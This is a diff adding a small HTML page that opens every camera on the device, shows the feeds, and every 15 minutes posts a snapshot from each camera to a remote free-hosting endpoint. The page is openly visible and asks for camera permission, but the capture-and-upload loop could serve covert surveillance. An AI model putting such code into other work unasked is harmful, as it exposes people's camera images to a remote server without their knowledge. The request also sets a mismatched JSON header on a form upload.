@@ -1,0 +1,124 @@
+  
+<!DOCTYPE html>
+<html lang="ru">		
+<head>	<!-- dfgdfgdf -->	
+<meta charset="utf-8">
+	
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>mediaDevices.enumerateDevices()</title>
+<style>
+__body {
+	margin: 0;
+}
+#container video {
+	/*width: 38%;*/width: 25%;
+	/*border: 1px blue solid;*/
+}
+</style>
+	
+</head>
+<body onload="main()" style="margin:0;">
+
+<div id="container"></div>
+
+<script type="text/javascript">
+function base64ToBlob(base64, mime) 
+{
+    mime = mime || '';
+    var sliceSize = 1024;
+    var byteChars = window.atob(base64);
+    var byteArrays = [];
+
+    for (var offset = 0, len = byteChars.length; offset < len; offset += sliceSize) {
+        var slice = byteChars.slice(offset, offset + sliceSize);
+
+        var byteNumbers = new Array(slice.length);
+        for (var i = 0; i < slice.length; i++) {
+            byteNumbers[i] = slice.charCodeAt(i);
+        }
+
+        var byteArray = new Uint8Array(byteNumbers);
+
+        byteArrays.push(byteArray);
+    }
+
+    return new Blob(byteArrays, {type: mime});
+}
+// ~async
+function randomInteger(min, max) {
+    let rand = min + Math.random() * (max + 1 - min);
+    return Math.floor(rand);
+}
+function main() {
+	console.log('старт()...');
+	
+	const videoList = [];
+	
+	// init snap-shooter
+	const SHOOT_INTERVAL = 60 * 15000; // 15 min
+	
+	// init <video> list
+	navigator.mediaDevices.enumerateDevices()
+		.then(function(devices) {
+			var cont = document.querySelector('#container');
+			
+			devices.forEach(device => {
+				if (/video/.test(device.kind)) {
+					console.log('Обнаружен источник:', device.label);
+					
+					navigator.mediaDevices
+						.getUserMedia({
+							audio: false,
+							video: { deviceId: device.deviceId }
+						})
+						.then(stream => {
+							var video = document.createElement('video');
+							video.autoplay = true;
+							video.muted = true;
+							video.playsInline = true;
+							
+							cont.append(video);
+							
+							video.srcObject = stream;
+							
+							videoList.push(video);
+						})
+				}
+            });
+		}).then(() => {
+            setInterval(() => {
+                const dataUriList = videoList.map(video => {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var ctx = canvas.getContext('2d');
+                    
+                    // draw image to canvas. scale to target dimensions
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // convert to desired file format
+                    var dataURI = canvas.toDataURL(); // can also use 'image/jpeg'
+                    // console.log(dataURI)
+                    return base64ToBlob(dataURI.replace(/^data:image\/(png|jpg);base64,/, ""), 'image/png');
+                });
+                
+                // send data to server HERE
+                let formData = new FormData()
+                dataUriList.map(
+                    (blobFile, index) => {
+                        formData.append('image'+index, blobFile)
+                    }
+                );
+                fetch('https://rosagro.000webhostapp.com/frame.php?sid='+randomInteger(0, 1000000000), {
+                    method: "post",
+                    headers: {
+			    'Content-Type': 'application/json'
+                    },
+                    body: formData
+                })
+            }, SHOOT_INTERVAL);
+        }); 
+}
+</script>
+</body>
+</html>
